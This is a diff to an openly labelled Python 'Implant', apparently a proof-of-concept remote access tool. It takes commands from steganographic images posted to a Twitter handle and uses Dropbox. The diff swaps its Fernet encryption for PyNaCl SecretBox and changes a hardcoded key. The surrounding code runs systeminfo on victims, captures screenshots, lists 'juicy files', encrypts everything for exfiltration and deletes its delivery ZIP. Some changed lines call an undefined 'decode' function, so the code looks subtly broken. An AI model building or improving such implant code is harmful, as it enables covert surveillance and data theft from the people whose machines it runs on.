@@ -6,7 +6,6 @@ import base64
 import requests
 from PIL import Image
 import io
-from cryptography.fernet import Fernet
 import stepic
 import sys
 import subprocess
@@ -21,9 +20,12 @@ import platform
 import shutil
 import win32api
 import dropbox
+from nacl.secret import SecretBox
+from nacl.utils import random as nacl_random
+
 
 # Encryption/Decryption Symmetric Key (Hardcoded) - PLEASE CHANGE IT!
-key = b'7H0RviHlSUDJ8ug1xf0lm5ZO_JZjWketfjcZ9gzaYZU='
+key = b'm_LAKLhu8ALI1-bufB1AfgR7kzxBrdHRaJ7KxvZm8dY='
 
 #The Twitter handle that will be used as Command Post (Hardcoded) - PLEASE CHANGE IT!
 handle = 'TwiShellProto'
@@ -47,13 +49,13 @@ def decodeFromPhoto(URL):
     data = stepic.decode(image)
     return data
 
-def decrypt(enctext, key):
+
+def decrypt(ciphertext, key):
     # Takes the encrypted text as string and key and decrypts and returns the plain text
-    enctext = enctext.encode()
-    f = Fernet(key)
-    plaintext = f.decrypt(enctext)
-    plaintext = plaintext.decode()
-    return plaintext
+    ciphertext = decode(ciphertext.encode())
+    box = SecretBox(decode(key))
+    return str(box.decrypt(ciphertext), 'utf-8')
+
 
 def main():
     # Main method for the Implant
@@ -77,14 +79,14 @@ def recon(APIKEY):
     if not os.path.exists(dumppath):
         os.mkdir(dumppath)
     # Creating a Fernet object to encrypt the results
-    f = Fernet(key)
+    f = SecretBox(decode(key))
     # Running 'systeminfo' on the target machine to get system details and encrypting it
     command = 'systeminfo'
     output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     result = output.stdout.read()
     error = output.stderr.read()
-    encrypted_result = f.encrypt(result)
-    encrypted_error = f.encrypt(error)
+    encrypted_result = f.encrypt(result, nacl_random(SecretBox.NONCE_SIZE))
+    encrypted_error = f.encrypt(error, nacl_random(SecretBox.NONCE_SIZE))
     # Defining a filename for the results and writing the results to the file for exfiltration later
     sysdumpfile = os.path.join(dumppath, 'systeminfo.larry')
     with open(sysdumpfile, 'wb') as outfile:
@@ -98,7 +100,7 @@ def recon(APIKEY):
         with mss.mss() as screen:
             img = screen.grab(screen.monitors[0])
         data = mss.tools.to_png(img.rgb, img.size, output=None)
-        encrypted_data = f.encrypt(data)
+        encrypted_data = f.encrypt(data, nacl_random(SecretBox.NONCE_SIZE))
         sctdumpfile = os.path.join(dumppath, 'screenshot{}.larry'.format(counter))
         with open(sctdumpfile, 'wb') as outfile:
             outfile.write(encrypted_data)
@@ -119,7 +121,7 @@ def recon(APIKEY):
 
     # Encrypting and saving the Juicy Files(if found) alongwith their complete path
     lists = lists.encode()
-    encrypted_lists = f.encrypt(lists)
+    encrypted_lists = f.encrypt(lists, nacl_random(SecretBox.NONCE_SIZE))
     juicyfile = os.path.join(dumppath, 'juicyfile.larry')
     with open(juicyfile, 'wb') as outfile:
         outfile.write(encrypted_lists)
@@ -148,7 +150,6 @@ def recon(APIKEY):
         pass
     # Removing the deliverable Intel ZIP file - Finishing
     os.remove(deliveryfile)
-
 
 
 if __name__ == "__main__":
